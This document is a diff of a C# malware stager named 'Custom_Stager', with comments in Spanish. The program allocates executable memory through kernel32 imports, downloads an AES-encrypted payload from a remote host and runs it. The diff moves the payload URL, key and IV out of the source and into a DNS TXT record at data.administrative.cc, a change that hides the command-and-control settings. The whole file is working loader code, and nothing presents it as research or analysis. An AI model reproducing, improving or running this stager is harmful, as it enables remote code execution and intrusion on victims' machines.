@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
@@ -7,14 +7,15 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
+using DnsClient; 
 
 namespace Custom_Stager
 {
     class Program
     {
-        private static string url = "https://www.administrative.cc/d2fc1b6a458f.cgi";
-        private static string AESKey = "9ae0c8e048d89fb3";
-        private static string AESIV = "789ca1a73299c6e0";
+        private static string url;
+        private static string AESKey;
+        private static string AESIV;
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -24,6 +25,45 @@ namespace Custom_Stager
 
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        // Método para obtener los datos del registro TXT usando DnsClient.NET
+        private static void GetDNSData()
+        {
+            try
+            {
+                // Crear un cliente DNS para realizar la consulta
+                var lookup = new LookupClient();
+
+                // Realizar la consulta al registro TXT del dominio "data.administrative.cc"
+                var result = lookup.Query("data.administrative.cc", QueryType.TXT);
+                var txtRecords = result.Answers.TxtRecords().FirstOrDefault();
+
+                if (txtRecords != null)
+                {
+                    // Asumimos que el registro TXT tiene 3 partes: URL, Key y IV
+                    var txtData = txtRecords.Text.ToArray();
+
+                    if (txtData.Length >= 3)
+                    {
+                        url = txtData[0];   // Primera parte es la URL
+                        AESKey = txtData[1]; // Segunda parte es la clave AES
+                        AESIV = txtData[2];  // Tercera parte es el IV
+                    }
+                    else
+                    {
+                        Console.WriteLine("Error: El registro TXT no contiene suficientes datos.");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("Error: No se encontraron registros TXT.");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error retrieving DNS data: " + ex.Message);
+            }
+        }
 
         private static byte[] AESDecrypt(byte[] ciphertext, string AESKey, string AESIV)
         {
@@ -119,16 +159,25 @@ namespace Custom_Stager
 
         public static void Main(String[] args)
         {
-            byte[] output = Download(url);
-            if (output != null && output.Length > 0)
+            // Llamar al método para obtener los datos del registro DNS TXT
+            GetDNSData();
+
+            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(AESKey) && !string.IsNullOrEmpty(AESIV))
             {
-                Execute(output);
+                byte[] output = Download(url);
+                if (output != null && output.Length > 0)
+                {
+                    Execute(output);
+                }
+                else
+                {
+                    Console.WriteLine("Error retrieving payload.");
+                }
             }
             else
             {
-                Console.WriteLine("Error retrieving payload.");
+                Console.WriteLine("Error: Could not retrieve URL/Key/IV from DNS.");
             }
         }
     }
 }
-
